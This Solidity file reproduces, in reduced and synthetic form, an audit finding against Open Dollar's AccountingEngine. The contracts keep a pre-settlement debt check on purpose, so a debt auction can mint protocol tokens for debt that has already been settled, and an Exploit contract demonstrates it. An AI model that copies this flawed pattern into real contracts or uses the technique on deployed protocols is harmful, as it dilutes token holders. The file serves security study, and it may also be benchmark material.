// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Open Dollar — [H-02] Missing debt check lets users start a debt auction of
    non-existent debt (Code4rena 2023-10-opendollar, finding #29348, reporter
    Falconhoof).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: AccountingEngine.auctionDebt() checks that there is enough
    unqueued/unauctioned bad debt to cover `debtAuctionBidSize` BEFORE calling
    `_settleDebt`, but `_settleDebt` is then free to consume ALL of the debt
    the check just validated (using the protocol's surplus coin buffer):

        if (_params.debtAuctionBidSize > _unqueuedUnauctionedDebt(_debtBalance))
            revert();                                    // @> VULN — checked pre-settle
        _settleDebt(_unqueuedUnauctionedDebt(_debtBalance));  // @> VULN — can zero it out
        // ... auction still starts at the full debtAuctionBidSize

    So a debt auction can start (minting/selling protocol tokens) to cover bad
    debt that no longer exists by the time the auction is created — diluting
    the protocol token for nothing.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced SAFEEngine. Tracks unbacked debt and system-coin surplus
///         per account, exactly like the real SAFEEngine's `debtBalance` /
///         `coinBalance` accounting used by AccountingEngine.
contract SafeEngine {
    mapping(address => uint256) public debtBalance;
    mapping(address => uint256) public coinBalance;

    /// @dev Seeds bad debt AND matching system-coin surplus on an account —
    ///      mirrors SAFEEngine.createUnbackedDebt(debtDestination,
    ///      coinDestination, rad), used here to set up the AccountingEngine's
    ///      starting state (it has both accrued bad debt and the surplus coin
    ///      to cover it, exactly at the auction threshold).
    function createUnbackedDebt(address debtDst, address coinDst, uint256 rad) external {
        debtBalance[debtDst] += rad;
        coinBalance[coinDst] += rad;
    }

    /// @notice Verbatim-shape SAFEEngine.settleDebt: burns `rad` of the
    ///         caller's own debt/coin pair.
    function settleDebt(uint256 rad) external {
        debtBalance[msg.sender] -= rad;
        coinBalance[msg.sender] -= rad;
    }
}

/// @dev Minimal protocol governance token, minted by the debt auction house.
contract ProtocolToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }
}

/// @notice Reduced DebtAuctionHouse. Models the worst-case, no-competing-bids
///         outcome: the initial bidder immediately receives the full
///         `amountToSell` of freshly-minted protocol tokens — exactly the
///         dilution the finding warns about, regardless of whether real bad
///         debt still backs the auction.
contract DebtAuctionHouse {
    ProtocolToken public protocolToken;

    constructor(ProtocolToken _protocolToken) {
        protocolToken = _protocolToken;
    }

    function startAuction(address initialBidder, uint256 amountToSell, uint256 amountToRaise)
        external
        returns (uint256 id)
    {
        protocolToken.mint(initialBidder, amountToSell);
        amountToRaise; // kept for interface fidelity; not needed further in this reduction
        id = 1;
    }
}

/// @notice Reduced AccountingEngine. Keeps the verbatim pre-settle debt check
///         and the settle-then-auction sequence from
///         AccountingEngine.sol#L181-183 that lets a debt auction start for
///         debt the settle call just consumed.
contract AccountingEngine {
    error AccEng_InsufficientDebt();

    SafeEngine public safeEngine;
    DebtAuctionHouse public debtAuctionHouse;

    uint256 public debtAuctionBidSize; // rad of debt an auction is sized to cover
    uint256 public initialDebtAuctionMintedTokens; // protocol tokens sold per auction
    uint256 public totalOnAuctionDebt;

    constructor(
        SafeEngine _safeEngine,
        DebtAuctionHouse _debtAuctionHouse,
        uint256 _debtAuctionBidSize,
        uint256 _initialDebtAuctionMintedTokens
    ) {
        safeEngine = _safeEngine;
        debtAuctionHouse = _debtAuctionHouse;
        debtAuctionBidSize = _debtAuctionBidSize;
        initialDebtAuctionMintedTokens = _initialDebtAuctionMintedTokens;
    }

    /// @notice Verbatim reduction of AccountingEngine._unqueuedUnauctionedDebt.
    function _unqueuedUnauctionedDebt(uint256 debtBalance) internal view returns (uint256) {
        return debtBalance > totalOnAuctionDebt ? debtBalance - totalOnAuctionDebt : 0;
    }

    /// @notice Verbatim-shape AccountingEngine.settleDebt: settles `rad` of
    ///         this contract's own bad debt using its coin surplus.
    function settleDebt(uint256 rad) public {
        safeEngine.settleDebt(rad);
    }

    /// @notice Verbatim reduction of AccountingEngine.auctionDebt
    ///         (AccountingEngine.sol#L181-183). The insufficient-debt check
    ///         runs against the PRE-settle debt balance; `settleDebt` is then
    ///         free to consume all of the debt the check just validated, yet
    ///         the auction still proceeds at the full `debtAuctionBidSize`.
    function auctionDebt() external returns (uint256 id) {
        uint256 debtBalance = safeEngine.debtBalance(address(this));
        // @> VULN: checked BEFORE settling — validates the PRE-settle amount only
        // FIX: re-check `debtAuctionBidSize <= _unqueuedUnauctionedDebt(...)` AFTER settling
        if (debtAuctionBidSize > _unqueuedUnauctionedDebt(debtBalance)) {
            revert AccEng_InsufficientDebt();
        }
        // @> VULN: settling with the FULL pre-settle unqueued/unauctioned amount can
        // zero out the very debt the check above just validated
        settleDebt(_unqueuedUnauctionedDebt(debtBalance));
        totalOnAuctionDebt += debtAuctionBidSize;
        id = debtAuctionHouse.startAuction(msg.sender, initialDebtAuctionMintedTokens, debtAuctionBidSize);
    }
}

/// @notice Attacker orchestrator. Deploys the reduced OpenDollar accounting
///         stack, seeds the AccountingEngine with EXACTLY `debtAuctionBidSize`
///         of real bad debt (and matching surplus coin), then calls
///         auctionDebt() directly — the check passes against the pre-settle
///         balance, settleDebt zeroes the debt out, and the auction still
///         mints protocol tokens to the attacker for debt that's now gone.
contract Exploit {
    uint256 public constant DEBT_AUCTION_BID_SIZE = 100 ether; // rad of debt per auction
    uint256 public constant TOKENS_PER_AUCTION = 500 ether; // protocol tokens sold per auction

    ProtocolToken public token; // nonce 1
    SafeEngine public safeEngine; // nonce 2
    DebtAuctionHouse public debtAuctionHouse; // nonce 3
    AccountingEngine public accountingEngine; // nonce 4

    constructor() {
        token = new ProtocolToken(); // CREATE nonce 1
        safeEngine = new SafeEngine(); // CREATE nonce 2
        debtAuctionHouse = new DebtAuctionHouse(token); // CREATE nonce 3
        accountingEngine = new AccountingEngine(safeEngine, debtAuctionHouse, DEBT_AUCTION_BID_SIZE, TOKENS_PER_AUCTION); // CREATE nonce 4

        // Seed the AccountingEngine with EXACTLY debtAuctionBidSize of real bad
        // debt, plus matching surplus coin to cover it (the boundary case: just
        // enough debt to pass the check, and just enough coin to fully settle it).
        safeEngine.createUnbackedDebt(address(accountingEngine), address(accountingEngine), DEBT_AUCTION_BID_SIZE);
    }

    function run() external {
        require(
            safeEngine.debtBalance(address(accountingEngine)) == DEBT_AUCTION_BID_SIZE, "setup: wrong debt balance"
        );

        // Attacker calls auctionDebt() directly (the finding's "second test
        // case" path: no external settleDebt call first).
        accountingEngine.auctionDebt();

        // HARM: the debt that justified the auction was fully consumed by the
        // internal settleDebt call, yet the auction proceeded anyway and
        // minted protocol tokens to the caller.
        require(safeEngine.debtBalance(address(accountingEngine)) == 0, "harm setup failed: debt should be zeroed");
        require(accountingEngine.totalOnAuctionDebt() == DEBT_AUCTION_BID_SIZE, "auction debt not recorded");
        require(token.balanceOf(address(this)) == TOKENS_PER_AUCTION, "harm not demonstrated: no tokens minted");
    }
}
